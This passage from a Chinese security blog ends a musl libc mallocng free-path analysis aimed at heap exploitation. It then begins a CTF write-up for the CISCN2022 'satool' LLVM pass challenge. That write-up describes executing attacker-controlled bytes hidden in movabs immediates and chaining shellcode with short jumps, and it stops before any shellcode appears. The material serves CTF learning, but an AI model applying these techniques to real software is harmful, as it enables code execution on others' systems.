unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="type">int</span> e = errno;</span><br><span class="line">			madvise(base, len, MADV_FREE);</span><br><span class="line">			errno = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>free用于释放chunk，首先需要找到该chunk所在的meta。这个功能是如何实现的呢？</p>
<p>每一个chunk的前面都保存着这个chunk在<code>group</code>中的索引，通过<code>get_slot_index</code>函数我们就可以知道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见索引值保存在索引为-3的位置。</p>
<p>对于索引值不为0的chunk，其还有一个<code>offset</code>保存在索引为-2的位置，它记录了当前chunk与第一个chunk首部的偏移量（右移4位的结果），因此通过这个值我们可以计算出该chunk所在<code>group</code>的首地址，由<code>group</code>中保存的<code>meta</code>地址找到<code>meta</code>。在<code>get_meta</code>函数中，找到<code>meta</code>后又找到了该<code>meta</code>所在的<code>meta_area</code>并进行了多项检查，防止<code>group</code>被伪造，如果我们想要通过伪造group来进行漏洞利用，就需要特别注意这里，这个我们以后再说。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/meta.h, line 129</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>anyway，拿到了<code>meta</code>地址之后，通过<code>get_stride</code>函数获取到其中保存的chunk的大小。</p>
<p>后面定义了一系列的变量，看到第一个if语句：<code>if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx)</code>。前面一个判断条件是判断这个chunk的大小是否大于2页（<code>PGSZ</code>就是一页的大小），后面的则是判断这个chunk是否是由<code>malloc</code>通过<code>mmap</code>分配出来的。记得在分析<code>malloc</code>时提到当分配的chunk过大时会使用<code>mmap</code>直接分配且<code>last_idx</code>的值会被设置为0。这个if语句的主要目的是在释放一个较大的chunk时，将该chunk内含的一些页在内核层面上释放，这通过<code>madvice</code>系统调用来实现。</p>
<p>往后是一个循环。如果该chunk所在的<code>meta</code>的<code>free_mask</code>为0（表示当前的chunk是该<code>meta</code>中唯一一个释放的chunk）或该chunk释放后该<code>meta</code>中所有chunk都被释放，则跳出循环。否则修改<code>free_mask</code>位后返回。这里面的if-else语句不用管，因为涉及锁的问题，一般Linux系统都会加锁，因此else基本不会执行到。</p>
<p>如果释放的chunk既不是第一个，也不是最后一个，则会执行循环后面的代码。后面的调用<code>nontrivial_free</code>是关键操作，也是我们利用的突破点。</p>
<h2 id="nontrivial_freesrcmallocmallocngfreec-line-72"><a class="markdownIt-Anchor" href="#nontrivial_freesrcmallocmallocngfreec-line-72"></a> nontrivial_free（<code>/src/malloc/mallocng/free.c, line 72</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大多数的chunk释放请求都会执行到这个函数，第一个参数是<code>meta</code>，第二个是该<code>meta</code>内需要释放的chunk的索引。</p>
<p><code>mask</code>是<code>free_mask</code>和<code>avail_mask</code>相或的结果，二者都是比特位标识的控制位。第一个判断<code>if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))</code>中第一个条件指的是该<code>meta</code>中所有chunk是否都处于被使用或被释放的状态，第二个条件通过一个函数判断这个chunk是否可以释放，一般都为真。进入if语句体中判断该<code>meta</code>是否有下一个<code>meta</code>，如果有，将当前<code>meta</code>出链表，且如果该<code>meta</code>在出链表之前是链首且此时该链表中还有<code>meta</code>，则激活链首的<code>meta</code>。这里的激活（<code>activate_group</code>）是修改了<code>avail_mask</code>值，函数内强制要求该<code>meta</code>在修改前的<code>avail_mask</code>为0。然后调用<code>free_group</code>并返回。</p>
<p>如果进入了else语句体，说明<code>mask=0</code>，即<code>free_mask</code>和<code>avail_mask</code>均为0，该<code>meta</code>中所有chunk均正在被使用。如果该<code>meta</code>不是链首，则将该<code>meta</code>链入链表。最后更新<code>free_mask</code>并返回。</p>
<p>至此，有关于musl内存分配与释放的相关函数已经基本分析完毕，下一篇文章将重点介绍musl libc的利用方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:38:22" itemprop="dateCreated datePublished" datetime="2023-02-28T22:38:22+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:55" itemprop="dateModified" datetime="2023-03-01T11:30:55+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>有了前面两道题的分析基础之后，我们不难发现，LLVM实际上就是一类基于C++的VM pwn，我们通过定义不同名字的函数或写入不同类型的指令让vm做一些事情，其中就包含触发漏洞。这篇文章笔者来分析一下2022年，也就是今年国赛题中的satool这道题。</p>
<h1 id="ciscn2022-satool"><a class="markdownIt-Anchor" href="#ciscn2022-satool"></a> CISCN2022-satool</h1>
<h2 id="step-1-通过readme了解这个llvm-pass的功能"><a class="markdownIt-Anchor" href="#step-1-通过readme了解这个llvm-pass的功能"></a> Step 1: 通过README了解这个LLVM pass的功能</h2>
<p>附件一共给了两个文件，有一个是readme文件，打开看看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">## Introduction</span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line">## How to run</span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line">## Example</span><br><span class="line"></span><br><span class="line">### IR before optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 2</span><br><span class="line">  %3 = add nsw i64 %2, 68</span><br><span class="line">  %4 = add nsw i64 %0, 6</span><br><span class="line">  %5 = add nsw i64 %4, -204</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### IR after optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = mul i64 %0, 2</span><br><span class="line">  %3 = add i64 %2, -132</span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个优化加减法的llvm pass，就像上面例子演示的一样，将多步加减法转换为两步的乘法和加法，即一个简单的合并同类项的优化。对于这种涉及算法的逆向，我们不妨首先想想，如果自己需要实现这个功能，应该如何编写算法。<br />
现在我们来看看源码中有什么漏洞。</p>
<h2 id="step-2-找到runonfunction覆写函数"><a class="markdownIt-Anchor" href="#step-2-找到runonfunction覆写函数"></a> Step 2: 找到runOnFunction覆写函数</h2>
<p>这道题的源码中没有无名的函数，这是因为符号表还在，更便于我们理解程序逻辑。当符号表还在的时候，我们应该找的是匿名命名空间的函数，别忘了第一篇文章中我们自己写的示例，就是将函数声什么的全部写在一个匿名空间中的。由此我们很容易能够找到runOnFunction函数。</p>
<p><img src="1.png" alt="" /><br />
接下来，我们进入runOnFunction查看。</p>
<h2 id="step-3-分析runonfunction函数"><a class="markdownIt-Anchor" href="#step-3-分析runonfunction函数"></a> Step 3: 分析runOnFunction函数</h2>
<h3 id="segment-1"><a class="markdownIt-Anchor" href="#segment-1"></a> Segment 1</h3>
<p><img src="2.png" alt="" /><br />
进入函数，首先是一个判断，通过报错字符串信息可以得知，这里是限定我们的函数只能有一个参数和一个基本块。</p>
<h2 id="segment-2"><a class="markdownIt-Anchor" href="#segment-2"></a> Segment 2</h2>
<p><img src="3.png" alt="" /><br />
接下来是调用了两个MBAPass类中的函数，首先查看MBAPass类的构造函数可知，this+4指针指向了一个mmap空间，大小为0x1000。首先其将这块内存的权限改为可写可执行，然后执行了handle函数，之后再将权限改为可读可执行，执行callCode函数。我们还是首先看下这两个函数的执行流程。</p>
<h2 id="step-4-分析handle函数"><a class="markdownIt-Anchor" href="#step-4-分析handle函数"></a> Step 4: 分析handle函数</h2>
<p>handle函数传入的第一个参数是MBAPass对象自身，第二个参数v29是llvm.Function指针。打开handle一看，好家伙这么多代码，一点点分析。</p>
<h3 id="segment-1-2"><a class="markdownIt-Anchor" href="#segment-1-2"></a> Segment 1</h3>
<p><img src="4.png" alt="" /><br />
猜测：v29是第一个基本块，Terminator是结束符的意思，暂时还不清楚到底指什么，Operand是操作数。</p>
<h3 id="segment-2-2"><a class="markdownIt-Anchor" href="#segment-2-2"></a> Segment 2</h3>
<p><img src="5.png" alt="" /><br />
注意<strong>这里的llvm::isa</strong>相当于Java中的instanceof关键字，判断Operand是否是llvm::constant的实例。如果是，说明这个操作数是一个常量数值，随后将其转换为整型常量并有符号扩展。然后调用了他自己定义的函数writeMovImm64。这个函数的功能是构建机器码指令，一开始想查Intel手册发现看不懂，后来直接用反汇编才试出来。<strong>writeMovImm64的功能是：当第二个参数为0时，向事先mmap的空间中写入&quot;mov rbx, &lt;第三个参数&gt;“指令，若第二个参数不为0则写入&quot;mov rax, &lt;第三个参数&gt;指令”。这两个指令都占10字节，写入完毕后指针后移10准备下一次写入。同理可以试出来writeRet函数就是写入一个&quot;ret&quot;指令</strong>。基于此我们也可以知道this+5这个指针的作用，其是用来作为mmap空间的游标使用的，在指针指向的位置写入指令。<br />
<img src="6.png" alt="" /></p>
<h3 id="segment-3"><a class="markdownIt-Anchor" href="#segment-3"></a> Segment 3</h3>
<p><img src="7.png" alt="" /><br />
这里判断操作数是否是函数的参数。然后写入&quot;mov rbx, 0; ret&quot;指令。</p>
<h3 id="segment-4"><a class="markdownIt-Anchor" href="#segment-4"></a> Segment 4</h3>
<p><img src="8.png" alt="" /><br />
如果操作数既不是立即数，又不是参数，那可能是局部变量。在else语句块中首先实例化了两个STL stack对象，分别为v25和v26变量，然后进行了push操作。如果写入指针的游标大于v30，就直接写入一个ret指令返回（<strong>v30=mmap内存起始地址+0xFF0，记住这个0xFF0，后面有关键作用</strong>）。</p>
<h3 id="segment-5"><a class="markdownIt-Anchor" href="#segment-5"></a> Segment 5</h3>
<p><img src="9.png" alt="" /><br />
再次之后弹出了两个栈顶的东西，其中将先弹出的转化为了二元运算符对象，当转换出错时还会报错。说明位于栈顶的应该是一个二元运算符。</p>
<h3 id="segment-6"><a class="markdownIt-Anchor" href="#segment-6"></a> Segment 6</h3>
<p><img src="10.png" alt="" /><br />
后面就开始判断运算符的种类了。还记得运算符的种类应该在哪一个文件里面查询吗？<code>llvm/IR/Instructions.def</code>！查询到13表示的是加法，15表示的是减法。这里的意思是二元运算符只能是加或减，否则报错退出。</p>
<h3 id="segment-7"><a class="markdownIt-Anchor" href="#segment-7"></a> Segment 7</h3>
<p><img src="11.png" alt="" /><br />
这里的v20和v19容易猜出来就是二元运算符的两个操作数。</p>
<p>后面首先判断v20是否是常量。如果是则判断其值是否为1或-1。若是则调用writeInc函数写入&quot;inc rax&quot;或&quot;dec rax&quot;指令，若不是则调用writeOpReg函数写入&quot;add rax, rbx&quot;指令（第二个参数是1。若第二个参数为0就是&quot;sub rax, rbx&quot;指令）。</p>
<p>如果v20是参数，则在this+12处加上v22。至于this+22是什么尚且不清楚，后面再行判断。</p>
<p>如果既不是常量也不是参数，则push压栈。通过栈后面的类型可以知道，v25中的值一定都是整数，而v26中的值是对象，其可以表示变量也可以表示一个常量。</p>
<h3 id="segment-8"><a class="markdownIt-Anchor" href="#segment-8"></a> Segment 8</h3>
<p><img src="12.png" alt="" /><br />
handle函数的最后一个部分，和Segment 7相同，Segment 7处理的是加减法的第一个操作数，而Segment 8以同样的方式处理第二个操作数。不过在此之前有一个判断符号的if语句，当运算为减的时候会将v22取相反数。</p>
<p>看到这里，我们已经对handle函数有了一些初步的了解，但是在细节方面的理解还是不够透彻。因此我们来尝试写一个函数，看看handle函数处理的全过程到底是什么样的。</p>
<p>这是根据readme函数改编的一段代码，只有后面的数值修改了（注意本题的.ll文件不能通过clang生成，因为clang生成的.ll代码会有一些store等其他指令的存在，mbapass无法识别）。我们下断点到stack析构函数调用的地方，也就是handle函数的末尾，看一下此时this+4这个mmap空间的情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 285912734</span><br><span class="line">  %3 = add nsw i64 %2, 685392891</span><br><span class="line">  %4 = add nsw i64 %0, 653902180</span><br><span class="line">  %5 = add nsw i64 %4, -204343281</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>下面是mmap空间的情况：<br />
<img src="13.png" alt="" /><br />
可以看出handle函数将我们的5行代码转换为了汇编指令保存。和静态分析的结果符合、</p>
<h2 id="step-5-分析callcode函数思考利用方式"><a class="markdownIt-Anchor" href="#step-5-分析callcode函数思考利用方式"></a> Step 5: 分析callCode函数，思考利用方式</h2>
<p><img src="14.png" alt="" /><br />
callCode函数很简单，就是执行刚刚写入到mmap空间的汇编指令。</p>
<p>由此可见，我们可以执行这一段指令。但是这里的指令只能是有限的几种，并不能达到我们的目的。不过别忘了我们第4步分析handle函数时注意到的一个小细节：当生成的汇编指令长度大于0xFF0时，handle函数不会再继续向下解析.ll代码，而是会直接退出。但很明显我们完全有可能让handle函数生成的汇编指令长度比0xFF0大几个字节，即让最后一条指令越过0xFF0的边界。注意其依然会执行。而且<strong>mmap出来的空间没有被释放</strong>，这说明当handle函数解析第二个函数的时候，我们之前解析得到的指令还保留在mmap空间中。如果两次解析出来的指令有错位，就可能会产生新的指令。</p>
<p>如第一次解析的指令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0	; 0x0</span><br><span class="line">movabs rax, 0x12345678	; 0xA</span><br><span class="line">mov rbx, rax	; 0x14</span><br><span class="line">movabs rax, 0x87654321	; 0x1E</span><br></pre></td></tr></table></figure>
<p>第二次解析的指令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0	; 0x0</span><br><span class="line">movabs rax, 0x12345678	; 0xA</span><br><span class="line">mov rbx, rax	; 0x14</span><br><span class="line">mov rbx, rax	; 0x17</span><br></pre></td></tr></table></figure>
<p>那么对于0x1A~0x1E这5个字节，如果有实际含义的话，很可能会被当成汇编指令执行，而这5个字节在第一次解析中是作为立即数存在，是可以被我们随意控制的。由此我们就可以执行一条长度不大于5字节的任意指令。不过需要注意的是，如果我们写的汇编指令长度不足0xFF0字节，在循环中会写入一个ret指令进去，跳出循环的条件就是汇编指令长度大于0xFF0，因此要想循环中添加ret指令的这个函数不调用，就必须要使得写入的汇编指令长度大于0xFF0字节，这样才能够执行0xFF0后面几个字节的任意代码。</p>
<p>通过测试我们可以发现，inc指令占用3字节，mov rax, rbx指令占用3字节，向rax或rbx直接赋值占用10字节。由于3和10的最大公因数为1，因此我们可以构造任意长度在0xFF0左右的汇编代码。但是很明显，不可能有shellcode能够用仅仅几个字节就getshell。考虑到我们可以控制movabs指令中的后8字节，可以将shellcode写到这一个个的8字节之中，再通过短转移指令将它们连接在一起，就有可能执行一个完整的shellcode。<strong>注意：短转移指令的长度为2字节，因此每一个8字节中的指令不能超过6字节。因此现有的shellcode可能无法直接使用，需要我们根据实际的调试结果进行一定的调整。</strong></p>
<p>为了shellcode编写的方便，我们将movabs指令作为我们写入的主要指令。通过前面的调试结果可以得知，绝大多数的movabs指令后面都回跟上一个add rax, rbx指令。我们人为规定每一个movabs中写入一条指令，然后通过短转移指令跳到前面一个movabs中的指令。</p>
<p>下面，我们就来构造我们预期要执行的shellcode。</p>
<h2 id="step-6-构造shellcode"><a class="markdownIt-Anchor" href="#step-6-构造shellcode"></a> Step 6: 构造shellcode</h2>
